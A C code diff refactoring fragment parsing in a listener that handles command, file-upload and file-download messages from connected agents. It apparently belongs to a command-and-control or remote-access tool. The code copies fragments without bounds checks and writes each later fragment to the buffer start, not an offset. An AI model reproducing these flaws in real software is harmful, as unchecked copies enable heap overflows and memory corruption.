@@ -36,6 +36,44 @@ extern pthread_mutex_t listener_send_queue_lock;
 extern volatile sig_atomic_t all_sigint;
 extern volatile sig_atomic_t shell_sigint;
 
+STATIC int listener_parse_first_fragment(Connected_Agents* CA, Queue_Message* q_message){
+	Fragment* fragment = q_message->fragment;
+
+	debug_print("Got first command or file fragment: %d\n", ntohl(fragment->first_payload.total_size));
+	// get payload size
+	CA->agents[q_message->id].total_message_size = ntohl(fragment->first_payload.total_size);
+	
+	// set last fragment index
+	CA->agents[q_message->id].last_fragment_index = 0;
+	
+	// allocate memory and null
+	CA->agents[q_message->id].message = malloc(CA->agents[q_message->id].total_message_size + 1);
+	memset(CA->agents[q_message->id].message, 0, CA->agents[q_message->id].total_message_size + 1);
+	
+	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
+	
+	// copy payload (not including total message size) to message buffer
+	memcpy(CA->agents[q_message->id].message, fragment->first_payload.actual_payload, this_payload_size);
+	
+	// record current size of message
+	CA->agents[q_message->id].current_message_size = this_payload_size;
+	debug_print("agents[q_message->id]->current_message_size: %d\n", CA->agents[q_message->id].current_message_size);
+	return RET_OK;
+}
+
+STATIC int listener_parse_next_fragment(Connected_Agents* CA, Queue_Message* q_message){
+	Fragment* fragment = q_message->fragment;
+
+	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index);
+	
+	// copy payload to end of message buffer
+	memcpy(CA->agents[q_message->id].message, fragment->next_payload, this_payload_size);
+	
+	// update current size of message
+	CA->agents[q_message->id].current_message_size += this_payload_size;
+	return RET_OK;
+}
+
 STATIC int handle_message(Connected_Agents* CA){
 	Queue_Message* message;
 	Fragment* fragment;
@@ -59,35 +97,10 @@ STATIC int handle_message(Connected_Agents* CA){
 	}
 	else if (ntohl(fragment->type) == TYPE_COMMAND || ntohl(fragment->type) == TYPE_PUT_FILE || ntohl(fragment->type) == TYPE_GET_FILE){
 		if (CA->agents[message->id].last_fragment_index == -1 && ntohl(fragment->index == 0)){
-			debug_print("Got first command or file fragment: %d\n", ntohl(fragment->first_payload.total_size));
-			// get payload size
-			CA->agents[message->id].total_message_size = ntohl(fragment->first_payload.total_size);
-			
-			// set last fragment index
-			CA->agents[message->id].last_fragment_index = 0;
-			
-			// allocate memory and null
-			CA->agents[message->id].message = malloc(CA->agents[message->id].total_message_size);
-			memset(CA->agents[message->id].message, 0, CA->agents[message->id].total_message_size);
-			
-			int this_payload_size = message->size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
-			
-			// copy payload (not including total message size) to message buffer
-			memcpy(CA->agents[message->id].message, fragment->first_payload.actual_payload, this_payload_size);
-			
-			// record current size of message
-			CA->agents[message->id].current_message_size = this_payload_size;
-			debug_print("agents[message->id]->current_message_size: %d\n", CA->agents[message->id].current_message_size);
-			
+			listener_parse_first_fragment(CA, message);
 		}
 		else if (ntohl(fragment->index) == CA->agents[message->id].last_fragment_index++){
-			int this_payload_size = message->size - sizeof(fragment->type) - sizeof(fragment->index);
-			
-			// copy payload to end of message buffer
-			memcpy(CA->agents[message->id].message, fragment->next_payload, this_payload_size);
-			
-			// update current size of message
-			CA->agents[message->id].current_message_size += this_payload_size;
+			listener_parse_next_fragment(CA, message);
 		}
 		else{
 			// We are out of order. Dump all collected packets and try again next time
